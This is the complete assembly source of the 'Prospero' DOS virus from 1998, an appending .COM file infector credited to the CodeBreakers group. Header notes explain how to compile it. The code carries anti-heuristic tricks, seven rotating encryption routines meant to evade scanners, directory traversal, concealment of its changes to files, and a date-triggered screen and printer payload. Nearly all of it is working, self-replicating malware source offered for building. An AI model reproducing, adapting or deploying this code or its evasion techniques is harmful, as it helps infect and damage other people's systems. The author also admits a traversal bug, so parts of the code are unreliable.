;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
;-------------------------------------------------------------------------
;                          Prospero  Virus          
;
;                   (C) Opic [Codebreakers 1998]
;-------------------------------------------------------------------------
;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

;IMPORTANT NOTES:

;compiled with TASM 4.1 and TLINK 7.1 

;to compile: TASM prospero.asm 
;            TLINK /t prospero.obj
;Rename Prospero.com Prospero.exe  (this is to avoid prospero infecting 
;itself first generation only                        

;Type: appending .com infector

;virus size: 1st Gen 1723 bytes 
;infected files grow 1712 bytes

;searches *.c* then comfirms *.COM

;does NOT infect command.com

;nor files bigger the 63824 bytes 

;Encryption: 5 types (XOR, NEG, ROR, ROL,and NOT)---|
; used in combination for 7 algorithms    <---------|

;Polymorphic: Yes (well Oligomorphic if you wanna get picky), there is a 
;stock of 7 different 3op encryption algorithms and delta offsets rutines
;from which the virus chooses (a different type of encryption and delta 
;offset is choosen every day of the week). the rest are safely 
;encrypted inside the virus body.

;antiheuristics: yes.

;Directory Transversal: DotDot method 

;restores infected file time/date stamps

;restores infected file DTA

;Rate of infection:no more then 7 per run

;restores infected file attributes

;payload criteria:The virus will manifest a payload on
;the 1st day of the month if the minutes are above 30.

;payload:a large graphical color text effect as well as a message
;is delivered from through printer:

;************************PROSPERO!**************************
;There is a path to the trancendece of the dollar: Embark                                                   
;rich beggars! Does magic bring prosperos to his knees?
;Reading pretty twilight, making grass uncertain?
;Oh,all that christmas snow shouldered by one birthday suit!
;The fate of the world under his armpit like a thermometer?
;Rejoice Villains! Your time has come.                                                    
;**************(C) Opic [CodeBreakers,98]*******************

;EXTRA SPECIAL GREETS AND THANX GO OUT TO:
;DARX_KIES, OWL[FS], DARKMAN, MIKEE, ALL the CodeBreakers and the countless
;others that have helped me learn and progress.
;
;OTHER: it has been awhile since I have looked at this virus, but it has come
;to my attention that it may have a bug in the directory transversal rutine,
;im not particularly interested in working on this virus any further, but 
;felt it should be noted for the record (suprisingly it made it to the
;supplimentals on "the wild list").
;------------------------------------------------------------------------
.286
prospero Segment
       Assume CS:prospero, DS:prospero, ES:prospero
       Org 100H
       jumps

start:                            
  mov cx,0ffffh                  ;loop to kill heuristic scanners

no_av1:
  jmp no_av2
  mov ax,4c00h
  int 21h

no_av2:
  loop no_av1
  call delta                     ;call delta

delta:                           ;duh!
  pop bp                         ;pop bp
  sub bp,offset delta            ;fer the distanc
  Nop                            ;You need those two nops.
  Nop                            ;
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
;----------setup-----------------
  lea si,[bp+c_start]            ;
  mov di,si                      ;  
  mov cx,virus_end - c_start     ;
  call encrypt                   ;
  jmp  c_start                   ;

value db 0                       ;decrypt value

stop:                            ;label for later

;---------to be polyed------------

encrypt:                         ;padding
  DB 20 Dup(90H)
  ret ;=21  for crypt
;--------start of crypt body-------
c_start:                         ;part to crypt

;------clear infection counter----
  mov byte ptr [bp+counter],0

  mov cx,3                       ;get first 3
  mov di,100h                    ;restore em!
  lea si,[bp+buff]
  rep movsb

;--------save DTA------------------
  lea di,[bp+NewDTA]
  mov si,80h                     ;DTA to save
  mov cx,2Ah                     ;length of DTA 2ah
  rep movsb                      ;save it

;-----------first------------------
find_first:                      ;find first                                   
  mov  ah,4eh                    ;file

find_next:                       ;we need this lata
  lea  dx,[bp+filemask]          ;what we is lookin fer
  int  21h                       ;now!
  jnc  verify                    ;find one? infect

;----------------DT--------------------------
dotdot:
  lea dx,[bp+dot]                ;get dot from dataseg
  mov ah,3Bh                     ;cd
  int 21h                        ;go!
  jnc find_first                 ;find first in new dir


;------------payload check--------------------
check_payload:                   ;payload check
  mov ah,2ah                     ;system date
  int 21h                        ;now!
  cmp dl,1                       ;is it the first?
  je n_check                   ;yes? second check
  jmp close
n_check:
  mov ah,2Ch                     ;internal clock
  cmp cl,30d                     ;minutes 30 or above?
  jae payload                     ;yes? lets do it!
  jmp close                      ;no? lets chill

;---------graphic payload-------------------------
payload:

  mov ax,13   ;set mode 13h
  int 10h     ;call bios
  mov dx,030ah;dh/dl are the line/column coordinates
  xor bh,bh   ;on page 0 
  mov ah,02h  ;02h=move cursor to
  int 10h     ;go
  push cs     ;
  pop ds      ;
  lea si,[bp+ offset message1];1st message 
  mov cx,14     ;length

show:           ;shows the message
  lodsb         ;keep goin
  mov bl,2      ;color 
  mov ah,0eh    ;write one letter
  int 10h       ;
  loop show     ;till we do em all
  add dx,507    ;get ready fer #2
  mov ah,02h    ;put cursor
  int 10h       ;
  lea si,[bp+ offset message2];mess2
  mov cx,27      ;length

show2:           ; 
  lodsb          ;
  mov bl,30      ;color
  mov ah,0eh     ;
  int 10h        ;
  loop show2     ;
  
  mov ah,01h   ;begin of printer sect of payload
  mov dx,0h
  int 17h     ;int for initializing printer
  lea si,string1
  mov cx,EndStr1-String1

PrintStr:
  mov ah,00h
  lodsb
  int 17h
  loop PrintStr

  mov ax,4c00h;exit
  int 21h     ;dos
   
              
;---------ret to host-------------
close:                           ;exit stage left

;---------restore DTA------------------------
  lea si,[bp+NewDTA]             ;saved DTA     
  mov di,80h                     ;area it was
  mov cx,2Ah                     ;length
  rep movsb                      ;write it

  push 100h                      ;start o file
  ret                            ;dar!
               
;-------start .com checks--------
verify:
  mov cx,13d                     ;max size of file name
  mov si,9eh                     ; !!!!

;---------*.com and not command--------
compare:
  lodsb                          ;find the point!
  cmp al,"."                     ;is it?
  jne compare                    ;no? try again
  inc si                         ;yes? next letter
  cmp word ptr [si], "MO"        ;does it spell .COM?
  je check_for_command_com       ;no find next!
  jmp close_file
check_for_command_com:
  cmp word ptr [bp+9eh+2], "MM"  ;is it command.com?
  je  close_file                 ;yes? next!

;-------------save attribs-----------------
infect:                          ;duh!
  Mov si,95h                     ; !!!! get dta
  mov cx,09h                     ;mov it to cx
  lea di,[bp+attribs]            ;save em
  rep movsb                      ;move em

;-------------clear atrribs----------------
  Mov  dx,9Eh                    ;filename in DTA
  mov  ax,4301h                  ;so we can infect
  xor  cx,cx                     ;all .coms
  int  21h                       ;

  mov ax,3d02h                   ;open file fer read/write
  mov dx,9eh                     ;get info
  int 21h                        ;go!
  xchg bx,ax                     ;put ax in bx

;---------------time/date-----------------------
  mov ax,5700h                   ;get time/date stamp
  int 21h                        ;save em----|
  push dx                        ;   <-------|
  push cx                        ;   <-------|

;--------------rand xor value--------------------
  in al,40h                      ;new crypt value
  mov  byte ptr [bp+value],al    ;put it place

;--------------first 3-----------------------------
  mov ah,3fh                     ;read 3 bytes from the file.. too
                                 ;
  mov cx,5                       ;be replaced with a jump to the virus
  lea dx,[bp+buff]               ;load buffer in dx
  int 21h                        ;go!

;------------size check---------------------
  mov di,9Ah
  cmp word ptr [di],63824        ;size check! no bigger then 63824 bytes
  jae close_file                  ;    
    
;-----------prev infected?----------------------
infect_check:
  pusha                         ; i saved registers since i did not take the time
                                ; to check which registers must be saved

  mov ax,4200h                  ; set r/w pointer to start of file +1
  xor cx,cx
  mov dx,1
  int 21h

  mov ah,3fh                    ; read the jump displacement
  mov cx,2
  lea dx,opbuf+bp
  int 21h

  mov ax,opbuf+bp
  add ax,3                      ; add 3 to jump displacement to get offset
                                ; of marker ':('

  mov dx,ax
  mov cx,0
  mov ax,4200h                  ; set pointer to marker offset
  int 21h

  mov ah,3fh                    ; read 2 bytes again
  mov cx,2
  lea dx,opbuf+bp
  int 21h

  popa                          ; registers popped here

  cmp opbuf+bp,'(:'  ; check for marker
  je close_file                 ; marker found? close file
  jmp short over_opbuf        ; otherwise proceed
                

over_opbuf:


;  mov si,9ah                     ;
;  mov ax,word ptr [si]           ;infected?
;  sub ax,virus_end - start + 3   ;check it?
;  cmp ax,word ptr[bp+buff+1]     ;compare..
;  je close_file                  ;already infected? outta here!

;----------infect already-------------------
  mov si,9ah
  mov ax,word ptr[si]
  sub ax,3
  mov word ptr[bp+three+1],ax

  mov ax,4200h                   ;start of file
  xor cx,cx                      ;clear
  xor dx,dx                      ;cx and dx
  int 21h                        ;now!

;------------write jump----------------------
  mov ah,40h                     ;write the 3 byte jump
  lea dx,[bp+three]              ;load em
  mov cx,3                       ;move em
  int 21h                        ;now!
  jmp next

close_file:                      ;
  jmp restc                      ;

;---------write cryptor------------------------------
  next:                          ;
  mov ax,4202h                   ;end of file
  xor cx,cx                      ;clear
  xor dx,dx                      ;em
  int 21h                        ;now!

;---------POLY: cryptor-------------------------------
                                 ;pick random cryptor from stock of 7
poly:                            ;determine 2nd part of cryptor
  mov ah,2ah                     ;get day of week
  int 21h                        ;now

;------find which cryptor to write to infection-----------
  or al,al                       ;is it.....sunday
  jz d0                          ;
  cmp al,001h                    ;mon
  je d1                          ;
  cmp al,002h                    ;tue
  je d2                          ;
  cmp al,003h                    ;wed
  jne td4                        ;
  Jmp d3
td4:
  cmp al,004h                    ;thur
  jne td5                        ;
  Jmp d4
td5:
  cmp al,005h                    ;fri
  jne td6                        ;
  Jmp d5
td6:
  Jmp d6

;-------load the cryptor we need--------------------
d0:                              ;pick and write Zero cryptor
  mov al,[bp+value]
  mov [bp+value0],al
  mov ah,40h
  lea dx,[bp+del]                ;
  mov cx,del1 - del              ;
  int 21h                        ;
  lea si,[bp+c_start]            ;
  lea di,[bp+virus_end]          ;load
  mov cx,virus_end - c_start     ;move
  call crypt
  jmp write
d1:                              ;pick and write 1st cryptor
  mov al,[bp+value]
  mov [bp+value1],al
  mov ah,40h
  lea dx,[bp+del1]               ;
  mov cx,del2 - del1             ;
  int 21h                        ;
  lea si,[bp+c_start]            ;
  lea di,[bp+virus_end]          ;load
  mov cx,virus_end - c_start     ;move
  call crypt1
  jmp write
d2:                              ;pick and write 2nd cryptor
  mov al,[bp+value]
  mov [bp+value2],al
  mov ah,40h
  lea dx,[bp+del2]               ;
  mov cx,del3 - del2             ;
  int 21h                        ;
  lea si,[bp+c_start]            ;
  lea di,[bp+virus_end]          ;load
  mov cx,virus_end - c_start     ;move
  call crypt2
  jmp write
d3:                              ;pick and write 3rd cryptor
  mov al,[bp+value]
  mov [bp+value3],al
  mov ah,40h
  lea dx,[bp+del3]               ;
  mov cx,del4 - del3              ;
  int 21h                        ;  
  lea si,[bp+c_start]            ;
  lea di,[bp+virus_end]          ;load
  mov cx,virus_end - c_start     ;move
  call crypt3
  jmp write
d4:                              ;pick and write 4th cryptor
  mov al,[bp+value]
  mov [bp+value4],al
  mov ah,40h
  lea dx,[bp+del4]               ;
  mov cx,del5 - del4             ;
  int 21h                        ;
  lea si,[bp+c_start]            ;
  lea di,[bp+virus_end]          ;load
  mov cx,virus_end - c_start     ;move
  call crypt4
  jmp write
nope:
  jmp close
d5:                              ;pick and write 5th cryptor
  mov al,[bp+value]
  mov [bp+value5],al
  mov ah,40h
  lea dx,[bp+del5]               ;
  mov cx,del6 - del5             ;
  int 21h                        ;
  lea si,[bp+c_start]            ;
  lea di,[bp+virus_end]          ;load
  mov cx,virus_end - c_start     ;move
  call crypt5
  jmp write
d6:
  mov al,[bp+value]
  mov [bp+value6],al
  mov ah,40h
  lea dx,[bp+del6]               ;
  mov cx,noc - del6              ;
  int 21h
  lea si,[bp+c_start]            ;
  lea di,[bp+virus_end]          ;load
  mov cx,virus_end - c_start     ;move
  call crypt6
  
;-------write crypted area--------------------
write:
  mov ah,40h                     ;write encrypted area
  lea dx,[bp+virus_end]          ;load
  mov cx,virus_end - c_start     ;move
  int 21h                        ;now!

count:                                            
  inc byte ptr [bp+counter]      ;add one

  
;-----------restore time/date---------------
restc:
  mov ax,5701h                   ;restore stamps
  pop cx                         ;remember?
  pop dx                         ;we saved these!
  int 21h                        ;

;-------------close--------------------------                          
  mov ah,3eh                     ;close file
  int 21h                        ;go!


;------------restore attribs-----------------
  mov ax,4301h                   ;set attribs
  Mov dx,9Eh                     ; !!!! name in DTA
  xor cx,cx                      ;clear!
  mov cl, byte ptr [bp+attribs]  ;attribs in cl
  int 21h                        ;go

                                                  
  cmp byte ptr [bp+counter],7    ;this isnt completly
                                 ;accurate due to the
                                 ;the fact that it
                                 ;counts fails from
                                 ;infection checks
                                 ;but i kinda like having
                                 ;a semi random infection check 
  ja nope                        ;and exit


;--------------next and infection check----------
next1:
  
  mov  ah,4Fh                    ;find next file
  jmp find_next                  ;continue!

;-----------our stock of cryptors------------

del:
   db ':('
  cli                            ; 1
  db   0E8h,0,0                  ; 3
  pop  ax                        ; 1 
  sti                            ; 1
  sub  ax,offset delta+1         ; 3
  xchg bp,ax                     ; 1 =10

  lea si,[bp+c_start]            ;
  mov di,si                      ;  
  mov cx,virus_end - c_start     ;
  call crypt                     ;
  Jmp Del1
Value0 db 0
crypt:
  lodsb                          ;
  Push CX
  Nop
  Mov CL,4
  rol al,CL                      ;
  Nop
  neg al                         ;
  rol al,CL                      ;
  Nop
  Pop CX
  stosb                          ;
  Nop
  loop crypt                     ;
  ret                            ;21 !!!
  Nop
  Nop
;--------------------------------------------

del1:
   db ':('
  db   0E8h,00,00               ;
  sti                           ;
  pop  bp                       ;
  xchg bx,ax                    ;
  sub  bp,offset delta          ;

  lea si,[bp+c_start]            ;
  mov di,si                      ;  
  mov cx,virus_end - c_start     ;
  call crypt1                    ;
  Jmp Del2
Value1 db 0
crypt1:
 Nop
 lodsb                           ;
 Nop
 neg al                          ;
 Push CX
 Mov CL,4
 ror al,CL                       ;
 Pop CX
 Nop
 neg al                          ;
 Nop
 stosb                           ;
 Nop
 loop crypt1                     ;
 ret                             ;21 !!!
 Nop
;------------------------------------------
del2:
  db ':('
 cld                             ;
 db   0E8h,0,0                   ;
 pop  bp                         ;
 clc                             ;
 sub  bp,offset delta+1          ;

lea si,[bp+c_start]              ;
  mov di,si                      ;  
  mov cx,virus_end - c_start     ;
  call crypt2                    ;
  Jmp Del3
Value2 DB 0
crypt2:
 Nop
 Nop
 lodsb                           ;
 not al                          ;
 nop                             ;
 xor al,byte ptr [bp+value]      ;
 nop                             ;
 not al                          ;
 nop                             ;
 Nop
 stosb                           ;
 loop crypt2                     ;
 Nop
 ret                             ;21 !!!
;---------------------------------------
del3:
   db ':('
  sti                           ; 1
  nop                           ; 1
  db   0E8h,0,0                 ; 3
  pop  bp                       ; 1
  sub  bp,offset delta+2        ; 4=10                            

  lea si,[bp+c_start]            ;
  mov di,si                      ;  
  mov cx,virus_end - c_start     ;
  call crypt3                    ;
  Jmp Del4
Value3 db 0
crypt3:
 lodsb                           ;
 Push CX
 Nop
 Nop
 Mov CL,4
 ror al,cl                       ;
 not al                          ;
 Nop
 ror al,cl                       ;
 Nop
 Pop CX
 stosb                           ;
 loop crypt3                     ;
 Nop
 ret                             ;21 !!!
 Nop
;---------------------------------------
del4:
  db ':('
 db   0E8h,0,0                   ; 3
 pop  ax                         ; 1
 xchg bx,ax                      ; 1
 xchg bx,ax                      ; 1
 sub  ax,offset delta            ; 3
 xchg bp,ax                      ; 1

  lea si,[bp+c_start]            ;
  mov di,si                      ;  
  mov cx,virus_end - c_start     ;
  call crypt4                    ;
  Jmp Del5
Value4 db 0
crypt4:                          ;
 lodsb                           ;
 Push CX
 Mov CL,4
 xor al,byte ptr [bp+value]      ;
 rol al,cl                       ;
 xor al,byte ptr [bp+value]      ;
 Pop CX
 stosb                           ;
 loop crypt4                     ;
 ret                             ;21 !!!
;--------------------------------------
del5:
   db ':('
  db   0E8h,0,0                 ; 3
  nop                           ; 1
  pop  ax                       ; 1 
  nop                           ; 1
  sub  ax,offset delta          ; 3
  xchg bp,ax                    ; 1    ; = 10

  lea si,[bp+c_start]            ;
  mov di,si                      ;  
  mov cx,virus_end - c_start     ;
  call crypt5                    ;
  Jmp Del6
Value5 db 0
crypt5:                          ;
 Nop
 lodsb                           ;
 not al                          ;
 Push CX
 Nop
 Mov CL,4
 ror al,cl                       ;
 Nop
 Pop CX
 Nop
 not al                          ;
 Nop
 stosb                           ;
 Nop
 loop crypt5                     ;
 ret                             ;21 !!!
;--------------------------------------
del6:
  db ':('
 sti                             ; 1
 clc                             ; 1
 db   0E8h,0,0                   ; 3
 pop  ax                         ; 1
 sub  ax,offset delta +2         ; 3
 xchg bp,ax                      ; 1=10
lea si,[bp+c_start]              ;
  mov di,si                      ;  
  mov cx,virus_end - c_start     ;
  call crypt6                    ;
  Jmp Noc
Value6 db 0
crypt6:                          ;
 lodsb                           ;
 Push CX
 Mov CL,4
 ror al,CL
 Nop
 xor al,byte ptr [bp+value]
 ror al,CL
 Nop
 Pop CX
 stosb
 Nop
 loop crypt6
 ret
noc:                             ;21 !!!
                                 
;-----------DATA--------------------------
newdta   db 2ah dup(?)                         
filemask db '*.c*',0  
three    db 0e9h,0,0           
buff     db 0cdh,20h,0        
dot      db '..',0                    
message1 db "Prospero Virus"   ;14
message2 db "(C) Opic [CodeBreakers '98]" ;27
counter  db 0
attribs  db 0h
opbuf dw 0    	 
String1 db  '************************PROSPERO!**************************',0dh,0ah
        db  'There is a path to the trancendece of the dollar: Embark',0dh,0ah                                                   
        db  'rich beggars! Does magic bring prosperos to his knees?',0dh,0ah
        db  'Reading pretty twilight, making grass uncertain?',0dh,0ah
        db  'Oh,all that christmas snow shouldered by one birthday suit!',0dh,0ah
        db  'The fate of the world under his armpit like a thermometer?',0dh,0ah
        db  'Rejoice Villains! Your time has come.',0dh,0ah                                                       
        db  '**************(C) Opic [CodeBreakers,98]*******************',0Ch
EndStr1:         

;--------------------------------------------------------------------------

Virus_End:

prospero Ends
End Start
